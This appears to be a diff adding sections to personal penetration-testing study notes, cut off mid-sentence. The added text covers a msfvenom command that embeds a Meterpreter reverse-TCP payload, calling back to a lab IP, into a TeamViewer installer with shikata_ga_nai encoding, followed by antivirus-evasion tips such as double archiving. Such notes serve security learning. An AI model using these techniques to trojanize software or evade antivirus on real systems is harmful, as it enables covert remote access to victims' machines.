@@ -53,3 +53,21 @@ We could then deliver this to our target system, common ways include:
 > We also need to make sure it gets executed once on the system.
 
 ![[Metasploit#Scanning a payload for possible detection]]
+
+### Building a backdoor'ed executable
+You can build a payload into an existing executable by using the `-k` flag. This will embed the payload into the executable and when run, will create a separate thread from the main application that is running our backdoor.
+```sh
+# This command embeds the meterpreter stageless payload into the provided TeamViewer_Setup.exe.
+# It also encodes the payload using the shikata_ga_nai algo with 5 iterations.
+msfvenom window/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -i 5 -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe
+```
+> The only issue with this is that if the application is launched via a CLI, a second window running the payload will open too.
+
+## Evading AV detection
+There are many protection mechanisms eg. [[Intrusion Detection]] and AVs. These systems are getting sophisticated and are capable of detecting most *default* payloads. Some mechanisms for evading them are still present as most AVs heavily rely on signature detection.
+
+### Multi-layered archiving
+Using a tool like [RAR utility](https://www.rarlab.com/download.htm) (WinRAR for linux) we can double archive a payload, making it much harder to get the actual signature of the contents.
+
+### Using Encoding
+Although t
